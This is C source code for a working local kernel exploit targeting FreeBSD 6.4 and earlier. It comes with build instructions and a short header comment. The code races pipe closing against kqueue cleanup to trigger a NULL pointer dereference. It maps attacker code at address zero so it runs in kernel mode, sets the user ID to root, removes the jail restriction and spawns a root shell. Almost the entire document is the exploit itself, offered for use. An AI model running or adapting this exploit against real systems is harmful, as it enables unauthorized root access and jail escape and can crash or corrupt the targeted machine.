#if 0
FreeBSD 6.4 and below are vulnerable to race condition between pipeclose() and
knlist_cleardel() resulting in NULL pointer dereference. The following code
exploits vulnerability to run code in kernel mode, giving root shell and
escaping from jail.
#endif

/* 29.08.2009, babcia padlina
 * FreeBSD <= 6.4 pipeclose()/knlist_cleardel() race condition
 *
 * works only on multiprocessor systems
 * gcc -o padlina2 padlina2.c -lpthread
 */

#define _KERNEL

#include <sys/types.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/event.h>
#include <sys/timespec.h>
#include <pthread.h>
#include <fcntl.h>
#include <string.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/param.h>
#include <sys/linker.h>
#include <sys/proc.h>

int fd[2], kq;
struct kevent kev, ke[2];
struct timespec timeout;
volatile int gotroot = 0;

static void kernel_code(void) {
	struct thread *thread;
	gotroot = 1;
	asm(
		"movl %%fs:0, %0"
		: "=r"(thread)
	);
	thread->td_proc->p_ucred->cr_uid = 0;
	thread->td_proc->p_ucred->cr_prison = NULL;

	return;
}

static void code_end(void) {
	return;
}

void do_thread(void) {
	while (!gotroot) {
		if (pipe(fd) < 0)
			perror("pipe");
		memset(&kev, 0, sizeof(kev));
		EV_SET(&kev, fd[0], EVFILT_READ, EV_ADD | EV_CLEAR, 0, 0, NULL);
		EV_SET(&kev, fd[1], EVFILT_WRITE, EV_ADD | EV_CLEAR, 0, 0, NULL);

		if (kevent(kq, &kev, 2, &ke, 2, &timeout) < 0)
			perror("kevent");

		close(fd[0]);
		close(fd[1]);
	}

	return;
}

void do_thread2(void) {
	usleep(100);
	while(!gotroot) {
		close(fd[0]);
		close(fd[1]);
	}

	return;
}

int main(void) {
	int i;
	pthread_t pth, pth2;

	if (!getuid() || !geteuid()) {
		printf("already root.\n");
		exit(-1);
	}

	printf("BEWARE! this exploit isn't 100%% reliable. successful exploitation\n"
		"may cause kernel memory corruption leading to system crash.\n"
		"it is also possible, that exploit will hang and such process\n"
		"will be unkillable. hit enter if you want to continue.\n");

	getchar();

	/* safe landing place for 6.4-RELEASE - it protects us from page fault
	   due to invalid read */

	if (mmap((void *)0x408b0000, 0x4000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
		perror("mmap");
		exit(-1);
	}

	if (mmap(0, 0x1000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_ANON | MAP_FIXED, -1, 0) < 0) {
		perror("mmap");
		exit(-1);
	}

	memcpy(0, &kernel_code, &code_end - &kernel_code);

	if ((kq = kqueue()) < 0) {
		perror("kqueue");
		exit(-1);
	}

	pthread_create(&pth, NULL, (void *)do_thread, NULL);
	pthread_create(&pth2, NULL, (void *)do_thread2, NULL);

	timeout.tv_sec = 0;
	timeout.tv_nsec = 1;

	printf("waiting for root... it should take no more than few seconds.\n"
	     "otherwise, run exploit again.\n");
	i = 0;

	while (!gotroot && i++ < 4000)
		usleep(100);

	setuid(0);

	if (getuid()) {
		printf("failed. on unpatched systems, the exploit will be unkillable from now. try again.\n");
		exit(-1);
	}

	execl("/bin/sh", "sh", NULL);

	return 0;
}